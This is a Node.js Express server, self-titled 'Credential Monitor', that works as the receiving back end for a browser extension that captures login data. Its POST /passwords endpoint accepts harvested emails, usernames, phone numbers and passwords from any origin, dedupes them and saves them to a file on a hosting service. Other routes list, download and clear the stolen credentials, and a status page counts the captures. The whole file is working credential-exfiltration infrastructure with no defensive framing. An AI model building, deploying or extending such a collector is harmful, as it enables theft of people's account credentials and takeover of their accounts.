const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const app = express();
const port = process.env.PORT || 3000;

// Enable CORS for all routes (important for extension)
app.use(cors({
    origin: '*',
    methods: ['GET', 'POST', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type']
}));

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Use /tmp directory for file storage on Render (writable directory)
const DATA_FILE = path.join('/tmp', 'captured_credentials.json');

// Store unique credentials
let uniqueCredentials = new Map();

// Load existing data from file on startup
function loadCredentials() {
    try {
        if (fs.existsSync(DATA_FILE)) {
            const data = fs.readFileSync(DATA_FILE, 'utf8');
            const credentials = JSON.parse(data);
            credentials.forEach(cred => {
                const key = generateCredentialKey(cred);
                uniqueCredentials.set(key, cred);
            });
            console.log(`✅ Loaded ${uniqueCredentials.size} credentials from file`);
        }
    } catch (error) {
        console.log('No existing data file found, starting fresh');
    }
}

// Save credentials to file
function saveCredentials() {
    try {
        const credentialsArray = Array.from(uniqueCredentials.values());
        fs.writeFileSync(DATA_FILE, JSON.stringify(credentialsArray, null, 2), 'utf8');
        console.log(`💾 Saved ${credentialsArray.length} credentials to file`);
    } catch (error) {
        console.error('Error saving credentials:', error);
    }
}

// Helper function to repeat string
function repeat(str, count) {
    return Array(count + 1).join(str);
}

// Format timestamp
function formatTime(timestamp) {
    const date = new Date(timestamp);
    return date.toLocaleString('en-IN', { 
        hour: '2-digit', 
        minute: '2-digit', 
        second: '2-digit',
        day: '2-digit',
        month: '2-digit',
        year: 'numeric'
    });
}

// Generate unique key for credential
function generateCredentialKey(data) {
    const url = data.url || 'unknown';
    let values = [];
    
    if (data.credentials) {
        if (data.credentials.email) values.push(data.credentials.email);
        if (data.credentials.username) values.push(data.credentials.username);
        if (data.credentials.phone) values.push(data.credentials.phone);
        if (data.credentials.password) values.push(data.credentials.password);
    } else if (data.field_value) {
        values.push(data.field_value);
    }
    
    values.sort();
    return `${url}|${values.join('|')}`;
}

// Auto detect field type based on value
function detectValueType(value) {
    if (!value) return 'unknown';
    
    const valueStr = String(value).toLowerCase().trim();
    
    // Email pattern
    if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(valueStr)) {
        return 'email';
    }
    
    // Phone pattern
    const digitsOnly = valueStr.replace(/\D/g, '');
    if (digitsOnly.length >= 8 && digitsOnly.length <= 15 && /^[\+]?[(]?[0-9]{1,4}[)]?[-\s\.]?[(]?[0-9]{1,4}[)]?[-\s\.]?[0-9]{1,5}[-\s\.]?[0-9]{1,5}$/.test(valueStr)) {
        return 'phone';
    }
    
    // Username pattern
    if (/^[a-zA-Z0-9_\.]{3,30}$/.test(valueStr) && !valueStr.includes('@') && isNaN(valueStr) && digitsOnly.length < 8) {
        return 'username';
    }
    
    return 'unknown';
}

// Display credentials function
function displayCredentials(data) {
    // Console clear karne ki zaroorat nahi on Render
    console.log('\n' + '='.repeat(60));
    
    console.log(`📍 URL: ${data.url || 'N/A'}`);
    console.log(`📄 Page: ${data.page_title || 'N/A'}`);
    console.log(`⏰ Time: ${formatTime(data.timestamp || new Date())}`);
    console.log('-'.repeat(60));
    
    if (data.type === 'complete_credentials' && data.credentials) {
        console.log('📋 COMPLETE CREDENTIALS FOUND:');
        
        if (data.credentials.email) {
            console.log(`   📧 Email: ${data.credentials.email}`);
        }
        
        if (data.credentials.username) {
            console.log(`   👤 Username: ${data.credentials.username}`);
        }
        
        if (data.credentials.phone) {
            console.log(`   📱 Phone: ${data.credentials.phone}`);
        }
        
        if (data.credentials.password) {
            console.log(`   🔑 Password: ${data.credentials.password}`);
        }
    }
    
    else if (data.field_value) {
        const type = detectValueType(data.field_value);
        let icon = '📝';
        let label = 'Value';
        
        if (type === 'email') icon = '📧';
        else if (type === 'phone') icon = '📱';
        else if (type === 'username') icon = '👤';
        else if (data.field_type === 'password') icon = '🔑';
        
        console.log(`   ${icon} ${data.field_type || 'Value'}: ${data.field_value}`);
    }
    
    console.log('-'.repeat(60));
    console.log(`📊 Total captures: ${uniqueCredentials.size}`);
    console.log('='.repeat(60));
}

// Load existing data on startup
loadCredentials();

// Periodic save (har 5 minute mein save karo)
setInterval(saveCredentials, 5 * 60 * 1000);

app.post('/passwords', (req, res) => {
    const data = req.body;
    const key = generateCredentialKey(data);
    
    if (!uniqueCredentials.has(key)) {
        uniqueCredentials.set(key, data);
        saveCredentials(); // Immediately save
        displayCredentials(data);
        console.log(`✅ New credential! Total: ${uniqueCredentials.size}`);
    }
    
    res.json({ status: 'ok', count: uniqueCredentials.size });
});

app.get('/passwords', (req, res) => {
    const credentialsArray = Array.from(uniqueCredentials.values());
    res.json({
        total: credentialsArray.length,
        credentials: credentialsArray
    });
});

app.delete('/passwords', (req, res) => {
    uniqueCredentials.clear();
    try {
        if (fs.existsSync(DATA_FILE)) {
            fs.unlinkSync(DATA_FILE);
        }
    } catch (e) {}
    
    console.log('🧹 All credentials cleared');
    res.json({ status: 'cleared', message: 'All credentials cleared' });
});

// Download endpoint
app.get('/download', (req, res) => {
    if (uniqueCredentials.size > 0) {
        const credentialsArray = Array.from(uniqueCredentials.values());
        res.json(credentialsArray);
    } else {
        res.status(404).json({ error: 'No credentials found' });
    }
});

// Simple status page
app.get('/', (req, res) => {
    res.send(`
        <html>
            <head>
                <title>Credential Monitor</title>
                <style>
                    body { font-family: Arial; padding: 20px; background: #1a1a1a; color: #fff; }
                    .container { max-width: 800px; margin: 0 auto; }
                    .stats { background: #333; padding: 20px; border-radius: 10px; }
                    h1 { color: #4CAF50; }
                    .count { font-size: 48px; color: #4CAF50; }
                </style>
            </head>
            <body>
                <div class="container">
                    <h1>🔐 Credential Monitor</h1>
                    <div class="stats">
                        <h2>Statistics</h2>
                        <div class="count">${uniqueCredentials.size}</div>
                        <p>Total credentials captured</p>
                        <hr>
                        <p><a href="/download" style="color: #4CAF50;">📥 Download JSON</a></p>
                        <p><small>Server is running on Render</small></p>
                    </div>
                </div>
            </body>
        </html>
    `);
});

// Health check
app.get('/health', (req, res) => {
    res.json({ 
        status: 'running', 
        timestamp: new Date().toISOString(),
        total_captures: uniqueCredentials.size,
        environment: 'Render'
    });
});

app.listen(port, '0.0.0.0', () => {
    console.log('='.repeat(60));
    console.log('🚀 Credential Monitor Server Started on Render');
    console.log('='.repeat(60));
    console.log(`📡 Port: ${port}`);
    console.log(`💾 Data file: ${DATA_FILE}`);
    console.log(`📊 Initial captures: ${uniqueCredentials.size}`);
    console.log('='.repeat(60));
});
